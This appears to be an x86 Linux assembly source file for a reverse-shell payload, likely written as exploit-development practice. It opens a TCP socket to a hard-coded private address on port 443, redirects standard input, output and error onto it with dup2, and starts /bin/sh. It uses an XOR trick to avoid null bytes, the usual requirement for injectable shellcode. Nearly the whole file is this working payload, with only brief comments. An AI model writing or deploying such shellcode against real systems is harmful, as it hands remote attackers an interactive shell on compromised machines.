;Socket		socket is created
;Connect	connects the socket referred to by the file descriptor sockfd to the address specified by addr
;Dup2		handing over stdin,stdout,stderror 
;Execve		/bin/sh


global _start			

section .text
_start:
	;[ socketcall socket ]
	push 0x66		; syscall socketcall
	pop eax
	xor ebx, ebx		; clears ebx
	xor ecx, ecx		; clears ecx
	
	mov bl, 0x1		; ebx = 1	socket

	push ecx		; socket option for IP {IPPROTO_IP = 0}
	push ebx		; socket type to open tcp {SOCK_STREAM = 1}
	push byte 0x2		; Internet Ip Protocol {AF_INET = 2}

	mov ecx, esp

	int 0x80		; exec socket
	mov edi, eax		; contains file describter sockfd

;---------------------------------------------------------------------


	;[ socketcall connect ]
	push 0x66		; syscall socketcall
	pop eax
	push 0x3
	pop ebx			; ebx = 3 connect


	push 0x8AF2A8C0		; IP for connect
	push 0xBB010002		; port for connect &  AF_INET = 2
	mov ecx,esp       	; socketaddr which is:
				; socketaddr.sin_family = AF_INET;
				; socketaddr.sin_port = 443
				; socketaddr.sin_addr.s_addr ="192.168.242.138"

	push 16			; addrlen = 0.0.0.0 (16 bits)			;connect(sockfd, (struct sockaddr *)&socketaddr, sizeof(addr))
	push ecx                ; addr to bind struct
	push edi                ; saved sockfd status
	mov ecx,esp             	
	
	int 0x80		; exec connect
	cmp al, 0		; if connection doesnt succeed, exit
	jne exit

;---------------------------------------------------------------------

	mov ebx, edi            ; saved sockfd status
	xor ecx, ecx		; clears ecx
	mov cl,0x2		; number of loop iteration
loop:
	mov al, 0x3f            ; syscall dup2
	int 0x80
	dec ecx                 ; decrement by 1
	jns loop


;---------------------------------------------------------------------


	;[ execve shell ]
	xor eax, eax
	mov al, 0xB             ; syscall execve
	jmp short shell
go:
	pop ebx			; get "/bin/shA" of the stack
	xor byte [ebx+7], 0x41	; null to end of /bin/sh
	push esi
	push ebx
	mov ecx, esp            ; argv = 0
	mov edx, esi            ; envp = 0
	int 0x80                ; exec execve

shell:
	call go
	bin: db "/bin/shA"

exit:
	push 4
	pop eax	
	push 17
	pop edx
	push 1
	pop ebx
	push esi
	push 0x726f7272
	push 0x45206e6f
	push 0x69746365
	push 0x6e6e6f43
	mov ecx, esp
	int 0x80

	xor eax, eax		
	mov al, 1		; syscall exit
	int 0x80		; exits gracefuly
